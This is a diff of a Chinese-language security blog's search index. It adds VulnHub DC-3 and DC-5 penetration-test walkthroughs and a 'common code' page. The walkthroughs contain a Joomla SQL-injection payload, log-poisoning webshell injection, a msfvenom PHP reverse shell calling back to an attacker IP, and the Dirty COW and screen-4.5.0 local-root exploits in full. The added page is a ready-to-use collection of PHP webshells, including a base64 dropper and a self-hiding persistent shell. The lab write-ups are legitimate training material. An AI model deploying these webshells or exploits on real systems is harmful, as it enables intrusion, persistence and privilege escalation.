@@ -151,9 +151,74 @@
       </tags>
   </entry>
   <entry>
+    <title>DC-3</title>
+    <url>/2022/04/16/DC-3/</url>
+    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/1.png" alt="img"></p>
+<p>发现目标主机为192.168.168.130</p>
+<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/2.png" alt="img"></p>
+<p>开放了80端口，浏览器打开</p>
+<p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p>
+<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p>
+<p><img src="/2022/04/16/DC-3/3.png" alt="img"></p>
+<p>是joomia<br>用dirsearch看看目录情况</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/4.png" alt="img"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p>
+<p><img src="/2022/04/16/DC-3/5.png" alt="img"></p>
+<p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/6.png" alt="img"></p>
+<p>确实是存在报错注入<br>上msf</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/7.png" alt="img"></p>
+<p>成功连上了</p>
+<p><img src="/2022/04/16/DC-3/8.png" alt="img"></p>
+<p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p>
+<p><img src="/2022/04/16/DC-3/9.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/10.png" alt="img"></p>
+<p>上传权限漏洞探测脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>给脚本加执行权限然后执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现脏牛</p>
+<p><img src="/2022/04/16/DC-3/11.png" alt="img"></p>
+<p>在www目录下下载脏牛提权脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/12.png" alt="img"></p>
+<p>OK！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/13.png" alt="img"></p>
+<p>DC3 completed</p>
+]]></content>
+      <categories>
+        <category>实践</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DC-4</title>
     <url>/2022/04/17/DC-4/</url>
-    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+    <content><![CDATA[<p>渗透环境：DC4 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
 
@@ -220,60 +285,70 @@
       </tags>
   </entry>
   <entry>
-    <title>DC-3</title>
-    <url>/2022/04/16/DC-3/</url>
-    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+    <title>DC-5</title>
+    <url>/2022/04/17/DC-5/</url>
+    <content><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/1.png" alt="img"></p>
-<p>发现目标主机为192.168.168.130</p>
-<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/DC-5/1.png" alt="img"></p>
+<p>发现目标主机为192.168.168.133</p>
+<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.133</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/2.png" alt="img"></p>
-<p>开放了80端口，浏览器打开</p>
-<p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p>
-<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p>
-<p><img src="/2022/04/16/DC-3/3.png" alt="img"></p>
-<p>是joomia<br>用dirsearch看看目录情况</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/DC-5/2.png" alt="img"></p>
+<p>开放了80端口浏览器打开</p>
+<p><img src="/2022/04/17/DC-5/3.png" alt="img"></p>
+<p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p>
+<p><img src="/2022/04/17/DC-5/4.png" alt="img"></p>
+<p>看看有没有存在sql注入，xss注入的可能<br>测试过，没反应<br>最后发现可以文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/4.png" alt="img"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p>
-<p><img src="/2022/04/16/DC-3/5.png" alt="img"></p>
-<p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/DC-5/5.png" alt="img"></p>
+<p>这里用日志注入的方法getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.133/&lt;?php @assert($_POST[&#x27;test&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/6.png" alt="img"></p>
-<p>确实是存在报错注入<br>上msf</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>查看日志文件位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/7.png" alt="img"></p>
-<p>成功连上了</p>
-<p><img src="/2022/04/16/DC-3/8.png" alt="img"></p>
-<p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p>
-<p><img src="/2022/04/16/DC-3/9.png" alt="img"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/DC-5/6.png" alt="img"></p>
+<p>查看文件，用蚁剑连接</p>
+<p><img src="/2022/04/17/DC-5/8.png" alt="img"></p>
+<h3 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.168.128 //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.128 LPORT=4444 -f raw &gt; shell.php //生成shell</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/10.png" alt="img"></p>
-<p>上传权限漏洞探测脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将shell.php通过蚁剑上传到&#x2F;tmp<br>访问对应shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thankyou.php?file=/tmp/shell.php</span><br></pre></td></tr></table></figure>
 
-<p>给脚本加执行权限然后执行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/DC-5/9.png" alt="img"></p>
+<p>连接成功</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p>发现脏牛</p>
-<p><img src="/2022/04/16/DC-3/11.png" alt="img"></p>
-<p>在www目录下下载脏牛提权脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/DC-5/10.png" alt="img"></p>
+<p>有个screen-4.5.0看看有没有漏洞可用</p>
+<p><img src="/2022/04/17/DC-5/11.png" alt="img"></p>
+<p>把第一个文件通过蚁剑上传，看看能不能run<br>结果报错了<br>分析对应sh</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/12.png" alt="img"></p>
-<p>OK！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure>
+<p>根据上面逻辑得到3段代码，本地编译<br>libhax.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/04/16/DC-3/13.png" alt="img"></p>
-<p>DC3 completed</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>
+
+<p>rootshell.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+
+<p>run.sh</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<p>把run.sh, rootshell, libhax.so上传到&#x2F;tmp文件夹中<br>执行run.sh文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
+
+<p>成功提权后</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/thisistheflag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/12.png" alt="img"></p>
+<p>获得flag，DC-5clear</p>
 ]]></content>
       <categories>
         <category>实践</category>
@@ -281,13 +356,26 @@
       <tags>
         <tag>渗透</tag>
         <tag>提权</tag>
-        <tag>msf</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
-    <title>常用木马</title>
-    <url>/2022/04/16/%E5%B8%B8%E7%94%A8%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[]]></content>
+    <title>常用代码汇总</title>
+    <url>/2022/04/17/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;L1ang&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>php内存马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);   <span class="comment">//1表示，忽略与客户端断开连接，继续执行</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);       <span class="comment">//隐藏当前文件</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="string">&quot;.shell.php&quot;</span>;</span><br><span class="line">    <span class="variable">$shell</span>=<span class="string">&quot;&lt;?php unlink(__FILE__);substr(md5(\$_GET[&#x27;user&#x27;]),28)==&#x27;ec6b&#x27;&amp;&amp;eval(\$_POST[&#x27;attack&#x27;]);?&gt;&quot;</span>; <span class="comment">#md5=L1ang</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$shell</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .shell.php&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.shell.php&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
+      </tags>
   </entry>
   <entry>
     <title>竞赛课-WEB5</title>
